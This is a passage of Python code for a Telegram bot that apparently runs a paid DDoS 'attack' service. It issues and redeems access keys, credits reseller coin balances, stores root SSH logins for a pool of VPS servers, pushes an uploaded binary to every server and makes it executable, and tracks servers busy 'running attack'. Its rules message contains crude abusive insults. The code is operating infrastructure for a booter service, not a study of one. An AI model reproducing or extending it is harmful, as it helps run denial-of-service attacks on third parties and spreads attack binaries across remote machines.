        await update.message.reply_text(f"✅ *Special Key `{key}` deleted successfully!*", parse_mode='Markdown')
    elif key in redeemed_keys_info:
        user_id = redeemed_keys_info[key]['redeemed_by']
        if isinstance(redeemed_users.get(user_id), dict):
            del redeemed_users[user_id]
        else:
            del redeemed_users[user_id]
        del redeemed_keys_info[key]
        await update.message.reply_text(f"✅ *Redeemed key `{key}` deleted successfully!*", parse_mode='Markdown')
    else:
        await update.message.reply_text("❌ *Key not found!*", parse_mode='Markdown')

    save_keys()
    return ConversationHandler.END

async def add_reseller_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can add resellers!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller.*", parse_mode='Markdown')
    return GET_RESELLER_ID

async def add_reseller_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        resellers.add(user_id)
        reseller_balances[user_id] = 0
        current_display_name = get_display_name_from_update(update)
        
        await update.message.reply_text(f"✅ *Reseller with ID {user_id} added successfully!*\n\n👑 *Bot Owner:* ", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END

    return ConversationHandler.END

async def remove_reseller_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can remove resellers!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller to remove.*", parse_mode='Markdown')
    return GET_REMOVE_RESELLER_ID

async def remove_reseller_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id in resellers:
            resellers.remove(user_id)
            if user_id in reseller_balances:
                del reseller_balances[user_id]
            current_display_name = get_display_name_from_update(update)
            
            await update.message.reply_text(f"✅ *Reseller with ID {user_id} removed successfully!*\n\n👑 *Bot Owner:*", parse_mode='Markdown')
        else:
            await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END

    return ConversationHandler.END

async def add_coin_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can add coins!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the user ID of the reseller.*", parse_mode='Markdown')
    return GET_ADD_COIN_USER_ID

async def add_coin_user_id(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id in resellers:
            context.user_data['add_coin_user_id'] = user_id
            await update.message.reply_text("⚠️ *Enter the amount of coins to add.*", parse_mode='Markdown')
            return GET_ADD_COIN_AMOUNT
        else:
            await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
            return ConversationHandler.END
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END

    return ConversationHandler.END

async def add_coin_amount(update: Update, context: CallbackContext):
    amount_str = update.message.text

    try:
        amount = int(amount_str)
        user_id = context.user_data['add_coin_user_id']
        if user_id in reseller_balances:
            reseller_balances[user_id] += amount
            current_display_name = get_display_name_from_update(update)
            
            await update.message.reply_text(
                f"✅ *Added {amount} coins to reseller {user_id}. New balance: {reseller_balances[user_id]}*\n\n",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ *Reseller not found!*", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ *Invalid amount! Please enter a number.*", parse_mode='Markdown')
        return ConversationHandler.END

    return ConversationHandler.END

async def balance(update: Update, context: CallbackContext):
    if not is_reseller(update):
        await update.message.reply_text("❌ *Only resellers can check their balance!*", parse_mode='Markdown')
        return

    user_id = update.effective_user.id
    balance = reseller_balances.get(user_id, 0)
    current_display_name = get_display_name_from_update(update)
    
    await update.message.reply_text(
        f"💰 *Your current balance is: {balance} coins*\n\n",
        parse_mode='Markdown'
    )

async def handle_photo(update: Update, context: CallbackContext):
    user_id = update.effective_user.id
    if user_id in feedback_waiting:
        del feedback_waiting[user_id]
        current_display_name = get_display_name_from_update(update)
        
        await update.message.reply_text(
            "✅ *Thanks for your feedback!*\n\n",
            parse_mode='Markdown'
        )

async def check_key_status(update: Update, context: CallbackContext):
    if not is_allowed_group(update):
        await update.message.reply_text("❌ *This command can only be used in the allowed group!*", parse_mode='Markdown')
        return

    user_id = update.effective_user.id
    user_name = update.effective_user.full_name
    current_time = time.time()
    current_display_name = get_display_name(update.effective_chat.id)

    if user_id in redeemed_users:
        if isinstance(redeemed_users[user_id], dict):
            if redeemed_users[user_id]['expiration_time'] <= current_time:
                status = "🔴 Expired"
            else:
                remaining_time = redeemed_users[user_id]['expiration_time'] - current_time
                days = int(remaining_time // 86400)
                hours = int((remaining_time % 86400) // 3600)
                status = f"🟢 Running ({days}d {hours}h remaining)"
            
            key_info = None
            for key, info in redeemed_keys_info.items():
                if info['redeemed_by'] == user_id and info.get('is_special'):
                    key_info = key
                    break
            
            await update.message.reply_text(
                f"🔍 *Special Key Status*\n\n"
                f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
                f"🆔 *ID:* `{user_id}`\n"
                f"🔑 *Key:* `{escape_markdown(key_info, version=2) if key_info else 'Unknown'}`\n"
                f"⏳ *Status:* {status}\n"
                f"⚡ *Max Duration:* {SPECIAL_MAX_DURATION} sec\n"
                f"🧵 *Max Threads:* {SPECIAL_MAX_THREADS}\n\n"
                f"👑 *Bot Owner:* {current_display_name}",
                parse_mode='Markdown'
            )
        elif isinstance(redeemed_users[user_id], (int, float)):
            if redeemed_users[user_id] <= current_time:
                status = "🔴 Expired"
            else:
                remaining_time = redeemed_users[user_id] - current_time
                hours = int(remaining_time // 3600)
                minutes = int((remaining_time % 3600) // 60)
                status = f"🟢 Running ({hours}h {minutes}m remaining)"
            
            key_info = None
            for key, info in redeemed_keys_info.items():
                if info['redeemed_by'] == user_id:
                    key_info = key
                    break
            
            await update.message.reply_text(
                f"🔍 *Key Status*\n\n"
                f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
                f"🆔 *ID:* `{user_id}`\n"
                f"🔑 *Key:* `{escape_markdown(key_info, version=2) if key_info else 'Unknown'}`\n"
                f"⏳ *Status:* {status}\n\n"
                f"👑 *Bot Owner:* {current_display_name}",
                parse_mode='Markdown'
            )
    else:
        await update.message.reply_text(
            f"🔍 *Key Status*\n\n"
            f"👤 *User:* {escape_markdown(user_name, version=2)}\n"
            f"🆔 *ID:* `{user_id}`\n\n"
            f"❌ *No active key found!*\n"
            f"ℹ️ *Use the Redeem Key button to activate your access.*\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )

async def add_vps_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can add VPS!", parse_mode='Markdown')
        return ConversationHandler.END
    
    await update.message.reply_text(
        "⚠️ Enter VPS details in format:\n\n"
        "<ip> <username> <password>\n\n"
        "Example: 1.1.1.1 root password123",
        parse_mode='Markdown'
    )
    return GET_VPS_INFO

async def add_vps_info(update: Update, context: CallbackContext):
    try:
        ip, username, password = update.message.text.split()
        VPS_LIST.append([ip, username, password])
        save_vps()
        
        current_display_name = get_display_name_from_update(update)
        
        await update.message.reply_text(
            f"✅ VPS added successfully!\n\n"
            f"IP: `{ip}`\n"
            f"Username: `{username}`\n"
            f"Password: `{password}`\n\n"
            f"👑 *Bot Owner:* {current_display_name}",
            parse_mode='Markdown'
        )
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid format! Please use:\n\n"
            "<ip> <username> <password>",
            parse_mode='Markdown'
        )
    
    return ConversationHandler.END

async def remove_vps_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can remove VPS!", parse_mode='Markdown')
        return ConversationHandler.END
    
    if not VPS_LIST:
        await update.message.reply_text("❌ No VPS available to remove!", parse_mode='Markdown')
        return ConversationHandler.END
    
    vps_list_text = "\n".join(
        f"{i+1}. IP: `{vps[0]}`, User: `{vps[1]}`" 
        for i, vps in enumerate(VPS_LIST))
    
    current_display_name = get_display_name_from_update(update)
    
    await update.message.reply_text(
        f"⚠️ Select VPS to remove by number:\n\n{vps_list_text}\n\n",
        parse_mode='Markdown'
    )
    return GET_VPS_TO_REMOVE

async def remove_vps_selection(update: Update, context: CallbackContext):
    try:
        selection = int(update.message.text) - 1
        if 0 <= selection < len(VPS_LIST):
            removed_vps = VPS_LIST.pop(selection)
            save_vps()
            current_display_name = get_display_name_from_update(update)
            
            await update.message.reply_text(
                f"✅ VPS removed successfully!\n\n"
                f"IP: `{removed_vps[0]}`\n"
                f"Username: `{removed_vps[1]}`\n\n",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text("❌ Invalid selection!", parse_mode='Markdown')
    except ValueError:
        await update.message.reply_text("❌ Please enter a valid number!", parse_mode='Markdown')
    
    return ConversationHandler.END

async def upload_binary_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can upload binary!", parse_mode='Markdown')
        return ConversationHandler.END
    
    if not VPS_LIST:
        await update.message.reply_text("❌ No VPS available to upload binary!", parse_mode='Markdown')
        return ConversationHandler.END
    
    current_display_name = get_display_name_from_update(update)
    
    await update.message.reply_text(
        "⚠️ Please upload the binary file you want to distribute to all VPS.\n\n"
        "The file will be uploaded to /home/master/ and made executable.\n\n",
        parse_mode='Markdown'
    )
    return CONFIRM_BINARY_UPLOAD

async def upload_binary_confirm(update: Update, context: CallbackContext):
    if not update.message.document:
        await update.message.reply_text("❌ Please upload a file!", parse_mode='Markdown')
        return ConversationHandler.END
    
    # Get the file
    file = await context.bot.get_file(update.message.document)
    file_name = update.message.document.file_name
    
    # Download the file locally first
    download_path = f"./{file_name}"
    await file.download_to_drive(download_path)
    
    current_display_name = get_display_name_from_update(update)
    
    message = await update.message.reply_text(
        f"⏳ Starting {file_name} binary upload to all VPS...\n\n",
        parse_mode='Markdown'
    )
    
    success_count = 0
    fail_count = 0
    results = []
    
    for i, vps in enumerate(VPS_LIST):
        ip, username, password = vps
        try:
            # Create SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=10)
            
            # Define the target directory (ONLY /home/master/)
            target_dir = "/home/master/"
            target_path = f"{target_dir}{file_name}"
            
            try:
                # Upload binary to /home/master/
                with SCPClient(ssh.get_transport()) as scp:
                    scp.put(download_path, target_path)
                
                # Make binary executable (chmod +x)
                ssh.exec_command(f'chmod +x {target_path}')
                
                # Verify upload
                stdin, stdout, stderr = ssh.exec_command(f'ls -la {target_path}')
                if file_name not in stdout.read().decode():
                    raise Exception("Upload verification failed")
                
                results.append(f"✅ {i+1}. {ip} - Success (Uploaded to {target_path})")
                success_count += 1
                
            except Exception as e:
                results.append(f"❌ {i+1}. {ip} - Failed: {str(e)}")
                fail_count += 1
            
            ssh.close()
            
        except Exception as e:
            results.append(f"❌ {i+1}. {ip} - Connection Failed: {str(e)}")
            fail_count += 1
    
    # Remove the downloaded file
    os.remove(download_path)
    
    # Send results
    result_text = "\n".join(results)
    current_display_name = get_display_name_from_update(update)
    
    await message.edit_text(
        f"📤 {file_name} Binary Upload Results:\n\n"
        f"✅ Success: {success_count}\n"
        f"❌ Failed: {fail_count}\n\n"
        f"{result_text}\n\n",
        parse_mode='Markdown'
    )
    
    return ConversationHandler.END

async def show_vps_status(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can view VPS status!", parse_mode='Markdown')
        return
    
    if not VPS_LIST:
        await update.message.reply_text("❌ No VPS configured!", parse_mode='Markdown')
        return
    
    # Send initial message
    message = await update.message.reply_text("🔄 Checking VPS statuses...", parse_mode='Markdown')
    
    status_messages = []
    online_vps = 0
    offline_vps = 0
    busy_vps = 0
    
    # Get list of busy VPS
    busy_vps_ips = [attack['vps_ip'] for attack in running_attacks.values() if 'vps_ip' in attack]
    
    for i, vps in enumerate(VPS_LIST):
        # Handle case where VPS entry might not have all 3 elements
        if len(vps) < 3:
            # Skip malformed entries or fill with defaults
            ip = vps[0] if len(vps) > 0 else "Unknown"
            username = vps[1] if len(vps) > 1 else "Unknown"
            password = vps[2] if len(vps) > 2 else "Unknown"
        else:
            ip, username, password = vps
            
        try:
            # Create SSH connection with short timeout
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username=username, password=password, timeout=10)
            
            # Determine status
            if ip in busy_vps_ips:
                status = "🟡 Busy (Running Attack)"
                busy_vps += 1
            else:
                status = "🟢 Online"
                online_vps += 1
            
            # Check binary status
            stdin, stdout, stderr = ssh.exec_command(f'ls -la /home/master/{BINARY_NAME} 2>/dev/null || echo "Not found"')
            output = stdout.read().decode().strip()
            
            if "Not found" in output:
                binary_status = "❌ Binary not found"
            else:
                # Check binary version
                stdin, stdout, stderr = ssh.exec_command(f'/home/master/{BINARY_NAME} --version 2>&1 || echo "Error executing"')
                version_output = stdout.read().decode().strip()
                
                if "Error executing" in version_output:
                    binary_status = "✅ Binary working"
                else:
                    binary_status = f"✅ Working (Version: {version_output.split()[0] if version_output else 'Unknown'})"
            
            ssh.close()
            
            status_msg = (
                f"🔹 *VPS {i+1} Status*\n"
                f"{status}\n"
                f"IP: `{ip}`\n"
                f"User: `{username}`\n"
                f"Binary: {binary_status}\n"
            )
            status_messages.append(status_msg)
            
        except Exception as e:
            status_msg = (
                f"🔹 *VPS {i+1} Status*\n"
                f"🔴 *Offline/Error*\n"
                f"IP: `{ip}`\n"
                f"User: `{username}`\n"
                f"Error: `{str(e)}`\n"
            )
            status_messages.append(status_msg)
            offline_vps += 1
    
    # Create summary
    summary = (
        f"\n📊 *VPS Status Summary*\n"
        f"🟢 Online: {online_vps}\n"
        f"🟡 Busy: {busy_vps}\n"
        f"🔴 Offline: {offline_vps}\n"
        f"Total: {len(VPS_LIST)}\n\n"
        f"👑 *Bot Owner:* {get_display_name(update.effective_chat.id if update.effective_chat.type in ['group', 'supergroup'] else None)}"
    )
    
    # Combine all messages
    full_message = summary + "\n\n" + "\n".join(status_messages)
    
    # Edit the original message with the results
    try:
        await message.edit_text(full_message, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error editing message: {e}")
        # If message is too long, send as new messages
        if len(full_message) > 4000:
            parts = [full_message[i:i+4000] for i in range(0, len(full_message), 4000)]
            for part in parts:
                await update.message.reply_text(part, parse_mode='Markdown')
        else:
            await update.message.reply_text(full_message, parse_mode='Markdown')

async def rules(update: Update, context: CallbackContext):
    current_display_name = get_display_name_from_update(update)
    
    rules_text = (
        "📜 *Rules:*\n\n"
        "1. Do not spam the bot.\n\n"
        "2. Only use the bot in the allowed group.\n\n"
        "3. Do not share your keys with others.\n\n"
        "4. Follow the instructions carefully.\n\n"
        "5. Respect other users and the bot owner.\n\n"
        "6. Any violation of these rules will result key ban with no refund.\n\n\n"
        "BSDK RULES FOLLOW KRNA WARNA GND MAR DUNGA.\n\n"
        "JO BHI RAJA KI MAKI CHUT PHAADKE SS DEGA USSE EXTRA KEY DUNGA.\n\n"
    )
    await update.message.reply_text(rules_text, parse_mode='Markdown')

async def add_group_id_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can add group IDs!*", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ *Enter the group ID to add to allowed list (include the - sign for negative IDs):*", parse_mode='Markdown')
    return ADD_GROUP_ID

async def add_group_id_input(update: Update, context: CallbackContext):
    try:
        group_id = int(update.message.text)
        if group_id not in ALLOWED_GROUP_IDS:
            ALLOWED_GROUP_IDS.append(group_id)
            current_display_name = get_display_name_from_update(update)
            
            await update.message.reply_text(
                f"✅ *Group ID {group_id} added successfully!*\n\n"
                f"*Current allowed groups:* {', '.join(str(gid) for gid in ALLOWED_GROUP_IDS)}\n\n",
                parse_mode='Markdown'
            )
        else:
            current_display_name = get_display_name_from_update(update)
            
            await update.message.reply_text(
                f"ℹ️ *Group ID {group_id} is already in the allowed list.*\n\n",
                parse_mode='Markdown'
            )
    except ValueError:
        await update.message.reply_text("❌ *Invalid group ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    
    return ConversationHandler.END

async def remove_group_id_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only the owner or co-owners can remove group IDs!*", parse_mode='Markdown')
        return ConversationHandler.END

    current_display_name = get_display_name_from_update(update)
    
    await update.message.reply_text(
        f"⚠️ *Enter the group ID to remove from allowed list.*\n\n"
        f"*Current allowed groups:* {', '.join(str(gid) for gid in ALLOWED_GROUP_IDS)}\n\n",
        parse_mode='Markdown'
    )
    return REMOVE_GROUP_ID

async def remove_group_id_input(update: Update, context: CallbackContext):
    try:
        group_id = int(update.message.text)
        if group_id in ALLOWED_GROUP_IDS:
            ALLOWED_GROUP_IDS.remove(group_id)
            current_display_name = get_display_name_from_update(update)
            
            await update.message.reply_text(
                f"✅ *Group ID {group_id} removed successfully!*\n\n"
                f"*Current allowed groups:* {', '.join(str(gid) for gid in ALLOWED_GROUP_IDS)}\n\n",
                parse_mode='Markdown'
            )
        else:
            current_display_name = get_display_name_from_update(update)
            
            await update.message.reply_text(
                f"❌ *Group ID {group_id} not found in allowed list!*\n\n",
                parse_mode='Markdown'
            )
    except ValueError:
        await update.message.reply_text("❌ *Invalid group ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    
    return ConversationHandler.END

async def show_menu(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only owner or co-owners can access this menu!*", parse_mode='Markdown')
        return
    
    current_display_name = get_display_name_from_update(update)
    
    if is_owner(update):
        await update.message.reply_text(
            f"📋 *Owner Menu* - Select an option:\n\n",
            parse_mode='Markdown',
            reply_markup=owner_menu_markup
        )
    else:
        await update.message.reply_text(
            f"📋 *Co-Owner Menu* - Select an option:\n\n",
            parse_mode='Markdown',
            reply_markup=co_owner_menu_markup
        )
    return MENU_SELECTION

async def back_to_home(update: Update, context: CallbackContext):
    if is_owner(update):
        current_display_name = get_display_name_from_update(update)
        
        await update.message.reply_text(
            f"🏠 *Returned to main menu*\n\n",
            parse_mode='Markdown',
            reply_markup=owner_markup
        )
    elif is_co_owner(update):
        current_display_name = get_display_name_from_update(update)
        
        await update.message.reply_text(
            f"🏠 *Returned to main menu*\n\n",
            parse_mode='Markdown',
            reply_markup=co_owner_markup
        )
    return ConversationHandler.END

async def reseller_status_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only owner or co-owners can check reseller status!*", parse_mode='Markdown')
        return ConversationHandler.END
    
    current_display_name = get_display_name_from_update(update)
    
    await update.message.reply_text(
        f"⚠️ *Enter reseller's username or ID to check status:*\n\n",
        parse_mode='Markdown'
    )
    return GET_RESELLER_INFO

async def reseller_status_info(update: Update, context: CallbackContext):
    input_text = update.message.text.strip()
    
    try:
        # Try to get user by ID
        user_id = int(input_text)
        try:
            user = await context.bot.get_chat(user_id)
        except Exception as e:
            logging.error(f"Error getting user by ID: {e}")
            await update.message.reply_text("❌ *User not found!*", parse_mode='Markdown')
            return ConversationHandler.END
    except ValueError:
        # Try to get user by username
        if not input_text.startswith('@'):
            input_text = '@' + input_text
        try:
            user = await context.bot.get_chat(input_text)
            user_id = user.id
        except Exception as e:
            logging.error(f"Error getting user by username: {e}")
            await update.message.reply_text("❌ *User not found!*", parse_mode='Markdown')
            return ConversationHandler.END
    
    if user_id not in resellers:
        await update.message.reply_text("❌ *This user is not a reseller!*", parse_mode='Markdown')
        return ConversationHandler.END
    
    try:
        # Calculate generated keys
        generated_keys = 0
        for key, info in keys.items():
            if info['generated_by'] == user_id:
                generated_keys += 1
        for key, info in special_keys.items():
            if info['generated_by'] == user_id:
                generated_keys += 1
        
        balance = reseller_balances.get(user_id, 0)
        
        # Escape username for Markdown
        username = escape_markdown(user.username, version=2) if user.username else 'N/A'
        
        current_display_name = get_display_name_from_update(update)
        
        message_text = (
            f"📊 *Reseller Status*\n\n"
            f"👤 *Username:* @{username}\n"
            f"🆔 *ID:* `{user_id}`\n"
            f"💰 *Balance:* {balance} coins\n"
            f"🔑 *Keys Generated:* {generated_keys}\n\n"
        )
        
        # Split message if too long (though this one shouldn't be)
        if len(message_text) > 4000:
            part1 = message_text[:4000]
            part2 = message_text[4000:]
            await update.message.reply_text(part1, parse_mode='Markdown')
            await update.message.reply_text(part2, parse_mode='Markdown')
        else:
            await update.message.reply_text(
                message_text,
                parse_mode='Markdown',
                reply_markup=owner_menu_markup if is_owner(update) else co_owner_menu_markup
            )
    except Exception as e:
        logging.error(f"Error in reseller_status_info: {e}")
        await update.message.reply_text(
            "❌ *An error occurred while processing your request.*",
            parse_mode='Markdown'
        )
    
    return MENU_SELECTION


def get_display_name_from_update(update):
    user = update.effective_user
    if user:
        return user.full_name or user.username or str(user.id)
    return "Unknown"



async def add_co_owner_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can add co-owners!*", parse_mode='Markdown')
        return ConversationHandler.END

    current_display_name = get_display_name_from_update(update)
    
    await update.message.reply_text(
        f"⚠️ *Enter the user ID of the co-owner to add.*\n\n",
        parse_mode='Markdown'
    )
    return GET_ADD_CO_OWNER_ID

async def add_co_owner_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id not in CO_OWNERS:
            CO_OWNERS.append(user_id)
            current_display_name = get_display_name_from_update(update)
            
            await update.message.reply_text(
                f"✅ *Co-owner with ID {user_id} added successfully!*\n\n"
                f"*Current co-owners:* {', '.join(str(oid) for oid in CO_OWNERS)}\n\n",
                parse_mode='Markdown'
            )
        else:
            current_display_name = get_display_name_from_update(update)
            
            await update.message.reply_text(
                f"ℹ️ *User ID {user_id} is already a co-owner.*\n\n",
                parse_mode='Markdown'
            )
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    
    return ConversationHandler.END

async def remove_co_owner_start(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text("❌ *Only the owner can remove co-owners!*", parse_mode='Markdown')
        return ConversationHandler.END

    if not CO_OWNERS:
        await update.message.reply_text("❌ *There are no co-owners to remove!*", parse_mode='Markdown')
        return ConversationHandler.END

    current_display_name = get_display_name_from_update(update)
    
    await update.message.reply_text(
        f"⚠️ *Enter the user ID of the co-owner to remove.*\n\n"
        f"*Current co-owners:* {', '.join(str(oid) for oid in CO_OWNERS)}\n\n",
        parse_mode='Markdown'
    )
    return GET_REMOVE_CO_OWNER_ID

async def remove_co_owner_input(update: Update, context: CallbackContext):
    user_id_str = update.message.text

    try:
        user_id = int(user_id_str)
        if user_id in CO_OWNERS:
            CO_OWNERS.remove(user_id)
            current_display_name = get_display_name_from_update(update)
            
            await update.message.reply_text(
                f"✅ *Co-owner with ID {user_id} removed successfully!*\n\n"
                f"*Current co-owners:* {', '.join(str(oid) for oid in CO_OWNERS) if CO_OWNERS else 'None'}\n\n",
                parse_mode='Markdown'
            )
        else:
            current_display_name = get_display_name_from_update(update)
            
            await update.message.reply_text(
                f"❌ *User ID {user_id} is not a co-owner!*\n\n",
                parse_mode='Markdown'
            )
    except ValueError:
        await update.message.reply_text("❌ *Invalid user ID! Please enter a valid numeric ID.*", parse_mode='Markdown')
        return ConversationHandler.END
    
    return ConversationHandler.END

async def set_display_name_start(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can set display name!", parse_mode='Markdown')
        return ConversationHandler.END
    
    # Check if we're in a group
    if update.effective_chat.type in ['group', 'supergroup']:
        context.user_data['setting_group_name'] = update.effective_chat.id
        current_display_name = get_display_name(update.effective_chat.id)
        
        await update.message.reply_text(
            f"⚠️ Enter the new display name for this group (current: {current_display_name}):\n\n",
            parse_mode='Markdown'
        )
    else:
        # In private chat, ask which group to set
        context.user_data['setting_group_name'] = None
        current_display_name = get_display_name(None)
        
        await update.message.reply_text(
            f"⚠️ Please enter the group ID you want to set the display name for (or 'default' for default name):\n\n",
            parse_mode='Markdown'
        )
    return GET_DISPLAY_NAME

async def set_display_name_input(update: Update, context: CallbackContext):
    if 'setting_group_name' not in context.user_data:
        await update.message.reply_text("❌ Error: Missing context data", parse_mode='Markdown')
        return ConversationHandler.END
    
    group_id = context.user_data['setting_group_name']
    new_name = update.message.text
    
    if group_id is None:
        # We're in private chat and need to get the group ID
        if new_name.lower() == 'default':
            group_id = None
        else:
            try:
                group_id = int(new_name)
                # Verify this is a valid group ID
                if group_id not in ALLOWED_GROUP_IDS:
                    await update.message.reply_text(
                        "❌ This group ID is not in the allowed list!",
                        parse_mode='Markdown'
                    )
                    return ConversationHandler.END
            except ValueError:
                await update.message.reply_text(
                    "❌ Invalid group ID! Please enter a numeric group ID or 'default'",
                    parse_mode='Markdown'
                )
                return ConversationHandler.END
            
        # Now ask for the actual display name
        context.user_data['setting_group_name'] = group_id
        current_display_name = get_display_name(group_id)
        
        await update.message.reply_text(
            f"⚠️ Now enter the display name you want to set (current: {current_display_name}):\n\n",
            parse_mode='Markdown'
        )
        return GET_DISPLAY_NAME
    else:
        # We have the group ID, set the name
        await set_display_name(update, new_name, group_id)
        return ConversationHandler.END

async def show_uptime(update: Update, context: CallbackContext):
    current_display_name = get_display_name_from_update(update)
    uptime = get_uptime()
    
    await update.message.reply_text(
        f"⏳ *Bot Uptime:* {uptime}\n\n",
        parse_mode='Markdown'
    )

async def settings_menu(update: Update, context: CallbackContext):
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ *Only owner or co-owners can access settings!*", parse_mode='Markdown')
        return
    
    current_display_name = get_display_name_from_update(update)
    
    await update.message.reply_text(
        f"⚙️ *Settings Menu*\n\n",
        parse_mode='Markdown',
        reply_markup=settings_markup
    )
    return MENU_SELECTION

async def co_owner_management(update: Update, context: CallbackContext):
    if not is_owner(update):
        await update.message.reply_text(
            "❌ *Only the owner can manage co-owners!*",
            parse_mode='Markdown',
            reply_markup=settings_markup
        )
        return
    
    await update.message.reply_text(
        "👥 *Co-Owner Management*\n\n"
        "Use these commands:\n"
        "/addcoowner - Add a co-owner\n"
        "/removecoowner - Remove a co-owner",
        parse_mode='Markdown',
        reply_markup=settings_markup
    )
async def handle_button_click(update: Update, context: CallbackContext):
    # Determine if update is a callback query (button press) or a message
    if update.callback_query:
        query = update.callback_query
        await query.answer()  # Acknowledge callback to Telegram
        
        data = query.data
        chat = query.message.chat
    else:
        data = update.message.text
        chat = update.effective_chat
    
    # Check if chat is private and user is authorized
    if chat.type == "private" and not is_authorized_user(update):
        image = get_random_start_image()
        current_display_name = get_display_name(None)  # Assuming it accepts None for default
        
        # Reply with photo + caption, depending on update type
        if update.callback_query:
            await query.message.reply_photo(
                photo=image['url'],
                caption="❌ *This bot is not authorized to use here.*\n\n",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_photo(
                photo=image['url'],
                caption="❌ *This bot is not authorized to use here.*\n\n",
                parse_mode='Markdown'
            )
        return
    
    # Continue your logic here, e.g., handle `data` value, etc.
    # Example:
    if update.callback_query:
        await query.edit_message_text(f"You clicked: {data}")
    else:
        await update.message.reply_text(f"You said: {data}")




    # ... existing code ...

    if query == 'Start':
        await start(update, context)
    elif query == 'Attack':
        await attack_start(update, context)
    elif query == 'Set Duration':
        await set_duration_start(update, context)
    elif query == 'Settings':
        await settings_menu(update, context)
    elif query == 'Co-Owner':
        await co_owner_management(update, context)
    elif query == 'Set Threads':
        await set_threads_start(update, context)
    elif query == 'Generate Key':
        await generate_key_start(update, context)
    elif query == 'Redeem Key':
        await redeem_key_start(update, context)
    elif query == 'Keys':
        await show_keys(update, context)
    elif query == 'Delete Key':
        await delete_key_start(update, context)
    elif query == 'Add Reseller':
        await add_reseller_start(update, context)
    elif query == 'Remove Reseller':
        await remove_reseller_start(update, context)
    elif query == 'Add Coin':
        await add_coin_start(update, context)
    elif query == 'Balance':
        await balance(update, context)
    elif query == 'Rules':
        await rules(update, context)
    elif query == 'Set Cooldown':
        await set_cooldown_start(update, context)
    elif query == '🔍 Status':
        await check_key_status(update, context)
    elif query == 'OpenBot':
        await open_bot(update, context)
    elif query == 'CloseBot':
        await close_bot(update, context)
    elif query == '🔑 Special Key':
        await generate_special_key_start(update, context)
    elif query == 'Menu':
        await show_menu(update, context)
    elif query == '🔗 Manage Links':
        await manage_links(update, context)    
    elif query == 'Back to Home':
        await back_to_home(update, context)
    elif query == 'Add Group ID':
        await add_group_id_start(update, context)
    elif query == 'Remove Group ID':
        await remove_group_id_start(update, context)
    elif query == 'RE Status':
        await reseller_status_start(update, context)
    elif query == 'VPS Status':
        await show_vps_status(update, context)
    elif query == '👥 Check Users':
        await show_users(update, context)    
    elif query == 'Add VPS':
        await add_vps_start(update, context)
    elif query == 'Remove VPS':
        await remove_vps_start(update, context)
    elif query == 'Upload Binary':
        await upload_binary_start(update, context)
    elif query == 'Add Co-Owner':
